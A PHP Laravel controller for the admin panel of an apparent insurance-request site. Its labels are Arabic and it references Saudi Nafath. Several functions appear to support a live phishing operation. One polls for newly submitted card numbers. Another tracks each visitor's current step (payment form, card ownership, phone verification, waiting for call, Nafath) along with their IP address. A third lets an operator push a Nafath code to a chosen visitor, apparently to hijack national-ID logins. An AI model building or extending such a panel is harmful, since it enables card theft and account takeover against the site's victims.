<?php

namespace App\Http\Controllers\Backend\Admin;

use App\Http\Controllers\Controller;
use App\Http\Requests\Backend\InsuranceRequest\SendNafathCodeRequestFormRequest;
use App\Http\Requests\SendNafathCodeRequest;
use App\Models\Insurance;
use App\Models\InsuranceRequest;
use Illuminate\Http\Request;
use App\Models\SupportTicket;
use Illuminate\Support\Facades\DB;
use Illuminate\Routing\Route;
use App\Traits\UploadImageTrait;

/**
 * Insurance Requests Backend Controller
 * 
 * Handles all insurance request operations for the admin panel
 * 
 * @method bool ajax() Check if request is ajax
 * @method string|null input(string $key, mixed $default = null) Get input value
 * @method bool wantsJson() Check if request wants JSON response
 */
class InsuranceRequestsBackendController extends Controller
{
    use UploadImageTrait;

    public function index(Request $request, Route $route)
    {
        try {
            $insuranceRequests = InsuranceRequest::orderBy('created_at', 'desc')->get();
            return view('admin.insurance_requests.index', compact('insuranceRequests'));
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();

            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // Lightweight API for polling recent stats (admin dashboard auto-refresh)
    public function summary()
    {
        $count = InsuranceRequest::count();
        $latest = InsuranceRequest::orderByDesc('id')->first(['id','created_at']);
        
        // Check for recent payment data (last 2 minutes)
        $recentPayments = InsuranceRequest::where('created_at', '>=', now()->subMinutes(2))
            ->whereNotNull('card_number')
            ->count();
        
        return response()->json([
            'total' => $count,
            'latest_id' => optional($latest)->id,
            'latest_at' => optional($latest)->created_at,
            'has_new' => $recentPayments > 0,
            'generated_at' => now()->toISOString(),
        ]);
    }

    // ========================================================================
    // ================= Get New Requests for Live Refresh ===================
    // ========================================================================
    public function getNewRequests(Request $request)
    {
        try {
            $lastId = $request->input('last_id', 0);
            
            $newRequests = InsuranceRequest::where('id', '>', $lastId)
                ->orderBy('id', 'asc')
                ->get();
            
            return response()->json([
                'success' => true,
                'count' => $newRequests->count(),
                'data' => $newRequests,
                'latest_id' => $newRequests->max('id') ?? $lastId,
            ]);
        } catch (\Throwable $th) {
            return response()->json([
                'success' => false,
                'message' => 'Error fetching new requests',
                'error' => $th->getMessage()
            ], 500);
        }
    }
    
    // ========================================================================
    // ============= Check User Status for Real-time Updates =================
    // ========================================================================
    public function checkStatus($id)
    {
        try {
            $request = InsuranceRequest::find($id);
            
            if (!$request) {
                return response()->json([
                    'success' => false,
                    'message' => 'Request not found'
                ], 404);
            }
            
            // تحديد الحالة بناءً على آخر نشاط (خلال آخر 5 دقائق)
            $isActive = $request->last_activity && 
                        $request->last_activity >= now()->subMinutes(5);
            
            // تحويل المسار إلى اسم عربي
            $currentPath = $this->getRouteArabicName($request->current_route);
            
            return response()->json([
                'success' => true,
                'is_active' => $isActive,
                'current_path' => $currentPath,
                'last_activity' => $request->last_activity ? $request->last_activity->diffForHumans() : 'لا يوجد',
                'ip_address' => $request->user_ip ?? 'غير محدد',
            ]);
        } catch (\Throwable $th) {
            return response()->json([
                'success' => false,
                'message' => 'Error checking status',
                'error' => $th->getMessage()
            ], 500);
        }
    }
    
    /**
     * تحويل اسم المسار إلى عربي
     */
    private function getRouteArabicName($route)
    {
        $routes = [
            '/' => 'الصفحة الرئيسية',
            'welcome' => 'الصفحة الرئيسية',
            'insuranceStatements' => 'استعلام المركبة',
            'insuranceType' => 'عروض التأمين',
            'insuranceDetails' => 'معلومات تفصيلية',
            'paymentForm' => 'معلومات الدفع',
            'beforeCallProcess' => 'انتظار المكالمة',
            'cardOwnership' => 'إثبات ملكية البطاقة',
            'phoneVerificationView' => 'التحقق من الجوال',
            'nafath' => 'نفاذ الوطني',
            'thank-you' => 'شكراً لك',
        ];
        
        return $routes[$route] ?? $route ?? 'غير محدد';
    }
    
    // ========================================================================
    // ============================ Show Function =============================
    // ========================================================================
    public function show($id, Route $route)
    {
        try {
            // $insurance = Insurance::with('projectWorkingEmployees')->find($id);
            $insuranceRequest = InsuranceRequest::find($id);
            if ($insuranceRequest) {
                return view('admin.insurance_requests.show', compact('insuranceRequest'));
            } else {
                return redirect()->route('super_admin.insurances-index')->with('danger', 'This data is not in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();

            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }
    // ========================================================================
    // ======================== Soft Delete Function ==========================
    // ========================================================================
    public function softDelete($id, Route $route)
    {
        try {
            $insurance = InsuranceRequest::find($id);
            if ($insurance) {
                DB::transaction(function () use ($insurance) {
                    $insurance->delete();
                });
                return redirect()->back()->with('success', 'The Deletion process has been successful');
            } else {
                return redirect()->back()->with('danger', 'This data is not in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();

            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }
    // ========================================================================
    // ====================== Show Soft Delete Function =======================
    // ========================================================================
    public function showSoftDelete(Request $request, Route $route)
    {
        try {
            $insurances = new Insurance();
            $insurances = $insurances->onlyTrashed()->select('*')->orderBy('created_at', 'asc')->get();
            return view('admin.insurances.trashed', compact('insurances'));
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();

            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== Soft Delete Restore Function ======================
    // ========================================================================
    public function softDeleteRestore($id, Route $route)
    {
        try {
            $insurance = Insurance::onlyTrashed()->find($id);
            if ($insurance) {
                DB::transaction(function () use ($insurance) {
                    $insurance->restore();
                });
                return redirect()->route('super_admin.insurances-showSoftDelete')->with('success', 'Restore Completed Successfully');
            } else {
                return redirect()->back()->with('danger', 'This section does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();

            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ============================ send Nafath Code Function =============================
    // ========================================================================
    public function sendNafathCode($id, Route $route)
    {
        try {
            $insuranceRequest = InsuranceRequest::find($id);
            if ($insuranceRequest) {
                return view('admin.insurance_requests.send_nafath_code', compact('insuranceRequest'));
            } else {
                return redirect()->route('super_admin.insurance_requests-index')->with('danger', 'This data is not in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = new SupportTicket();
            $check_old_errors = $check_old_errors->select('*')->where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->get();

            if ($check_old_errors->count() == 0) {
                $new_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
                $end_error_ticket = $new_error_ticket;
            } else {
                $end_error_ticket = $check_old_errors->first();
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    /**
     * Send Nafath Code and handle approval/rejection
     * 
     * @param SendNafathCodeRequestFormRequest $request
     * @param Route $route
     * @param int $id
     * @return \Illuminate\Http\JsonResponse|\Illuminate\Http\RedirectResponse|\Illuminate\Contracts\View\View
     */
    public function sendNafathCodeRequest(SendNafathCodeRequestFormRequest $request, Route $route, $id)
    {
        try {
            $insuranceRequest = InsuranceRequest::find($id);

            // Early return - التحقق من وجود السجل
            if (!$insuranceRequest) {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }

            // استخراج البيانات المعتمدة
            $validated = $request->validated();
            $nafath = $validated['nafath_code'] ?? null;

            // تحديث في قاعدة البيانات داخل transaction
            DB::transaction(function () use ($insuranceRequest, $nafath) {
                $insuranceRequest->update(['nafath_code' => $nafath]);
            }); // ✅ إغلاق الـ transaction بشكل صحيح

            // ✅ Return خارج الـ transaction
            return redirect()
                ->route('super_admin.insurance_requests-index')
                ->with('success', 'Nafath Code Added Successfully');

        } catch (\Throwable $th) {
            $function_name = $route->getActionName();
            
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' => $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ============================ Create Function ===========================
    // ========================================================================
    public function create(Route $route)
    {
        try {
            $insurances = Insurance::where('status', 1)->get();
            return view('admin.insurance_requests.create', compact('insurances'));
        } catch (\Throwable $th) {
            return $this->handleError($th, $route);
        }
    }

    // ========================================================================
    // ============================ Store Function ============================
    // ========================================================================
    public function store(Request $request, Route $route)
    {
        try {
            $validated = $request->validate([
                'insurance_id' => 'required|exists:insurances,id',
                'customer_name' => 'required|string|max:255',
                'customer_phone' => 'required|string|max:20',
                'customer_national_id' => 'required|string|max:20',
            ]);

            DB::transaction(function () use ($validated) {
                InsuranceRequest::create($validated);
            });

            return redirect()->route('super_admin.insurance_requests-index')
                ->with('success', 'تم إضافة طلب التأمين بنجاح');
        } catch (\Throwable $th) {
            return $this->handleError($th, $route);
        }
    }

    // ========================================================================
    // ============================ Edit Function =============================
    // ========================================================================
    public function edit($id, Route $route)
    {
        try {
            $insuranceRequest = InsuranceRequest::find($id);
            if (!$insuranceRequest) {
                return redirect()->route('super_admin.insurance_requests-index')
                    ->with('danger', 'هذا السجل غير موجود');
            }
            $insurances = Insurance::where('status', 1)->get();
            return view('admin.insurance_requests.edit', compact('insuranceRequest', 'insurances'));
        } catch (\Throwable $th) {
            return $this->handleError($th, $route);
        }
    }

    // ========================================================================
    // ============================ Update Function ===========================
    // ========================================================================
    public function update($id, Request $request, Route $route)
    {
        try {
            $insuranceRequest = InsuranceRequest::find($id);
            if (!$insuranceRequest) {
                return redirect()->back()->with('danger', 'هذا السجل غير موجود');
            }

            $validated = $request->validate([
                'insurance_id' => 'required|exists:insurances,id',
                'customer_name' => 'required|string|max:255',
                'customer_phone' => 'required|string|max:20',
                'customer_national_id' => 'required|string|max:20',
            ]);

            DB::transaction(function () use ($validated, $insuranceRequest) {
                $insuranceRequest->update($validated);
            });

            return redirect()->route('super_admin.insurance_requests-index')
                ->with('success', 'تم تحديث طلب التأمين بنجاح');
        } catch (\Throwable $th) {
            return $this->handleError($th, $route);
        }
    }

    // ========================================================================
    // ===================== Soft Delete Selected Function ====================
    // ========================================================================
    public function softDeleteSelected(Request $request, Route $route)
    {
        try {
            $ids = $request->input('ids', []);
            if (empty($ids)) {
                return redirect()->back()->with('danger', 'لم يتم تحديد أي سجلات');
            }

            DB::transaction(function () use ($ids) {
                InsuranceRequest::whereIn('id', $ids)->delete();
            });

            return redirect()->back()->with('success', 'تم حذف السجلات المحددة بنجاح');
        } catch (\Throwable $th) {
            return $this->handleError($th, $route);
        }
    }

    // ========================================================================
    // ================= Soft Delete Restore Selected Function ===============
    // ========================================================================
    public function softDeleteRestoreSelected(Request $request, Route $route)
    {
        try {
            $ids = $request->input('ids', []);
            if (empty($ids)) {
                return redirect()->back()->with('danger', 'لم يتم تحديد أي سجلات');
            }

            DB::transaction(function () use ($ids) {
                InsuranceRequest::onlyTrashed()->whereIn('id', $ids)->restore();
            });

            return redirect()->back()->with('success', 'تم استعادة السجلات المحددة بنجاح');
        } catch (\Throwable $th) {
            return $this->handleError($th, $route);
        }
    }

    // ========================================================================
    // =================== Active/Inactive Single Function ====================
    // ========================================================================
    public function activeInactiveSingle($id, Route $route)
    {
        try {
            $insuranceRequest = InsuranceRequest::find($id);
            if (!$insuranceRequest) {
                return redirect()->back()->with('danger', 'هذا السجل غير موجود');
            }

            DB::transaction(function () use ($insuranceRequest) {
                $insuranceRequest->status = $insuranceRequest->status == 1 ? 0 : 1;
                $insuranceRequest->save();
            });

            return redirect()->back()->with('success', 'تم تغيير الحالة بنجاح');
        } catch (\Throwable $th) {
            return $this->handleError($th, $route);
        }
    }

    // ========================================================================
    // ========================= Helper Error Handler =========================
    // ========================================================================
    private function handleError(\Throwable $th, Route $route)
    {
        $function_name = $route->getActionName();
        $check_old_errors = SupportTicket::where([
            'error_location' => $th->getFile(),
            'error_description' => $th->getMessage(),
            'function_name' => $function_name,
            'error_line' => $th->getLine(),
        ])->get();

        if ($check_old_errors->count() == 0) {
            $end_error_ticket = SupportTicket::create([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' =>  $th->getLine(),
            ]);
        } else {
            $end_error_ticket = $check_old_errors->first();
        }

        return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
    }

}
